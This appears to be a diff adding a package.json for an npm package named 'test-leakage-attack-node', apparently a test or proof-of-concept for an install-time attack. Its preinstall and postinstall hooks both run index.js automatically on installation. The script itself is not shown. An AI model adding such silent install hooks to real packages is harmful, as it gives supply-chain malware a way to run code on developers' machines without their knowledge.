@@ -1,0 +1,16 @@
+{
+  "name": "test-leakage-attack-node",
+  "version": "1.0.0",
+  "description": "TEST",
+  "type": "module",
+  "main": "index.js",
+  "types": "index.d.ts",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node index.js",
+    "postinstall": "node index.js"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "MIT"
+}
